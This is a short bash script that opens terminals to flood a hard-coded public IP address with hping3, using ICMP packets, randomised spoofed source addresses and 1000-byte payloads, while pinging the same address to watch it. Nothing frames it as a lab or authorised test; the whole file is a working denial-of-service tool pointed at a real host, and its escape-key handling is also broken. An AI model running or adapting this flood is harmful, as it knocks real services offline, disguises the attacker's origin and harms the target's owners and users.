#!/bin/bash

# Function to run the hping3 command in a new terminal window
run_hping3() {
  gnome-terminal -- hping3 --flood -1 --rand-source -p 443 -p 80 -d 1000 40.112.243.3
}

# Function to run the ping command in a new terminal window
run_ping() {
  gnome-terminal -- ping 40.112.243.3
}

# Start hping3 in the background
run_hping3 &

# Get the PID of the last background process (gnome-terminal)
gnome_terminal_pid=$!

# Function to check for user pressing the Escape key
check_for_escape() {
  while true; do
    # Check if the gnome-terminal process is still running
    if ! ps -p $gnome_terminal_pid > /dev/null; then
      break
    fi

    # Check for the Escape keypress
    if xdotool keydown Escape; then
      # Terminate the hping3 process
      kill -TERM $!
      break
    fi
  done
}

# Start checking for the Escape keypress in the background
check_for_escape &

# Run the ping command in a separate terminal
run_ping

# Wait for the hping3 process to finish
wait $!

# Terminate the Escape key check
kill $!

echo "hping3 has been terminated."
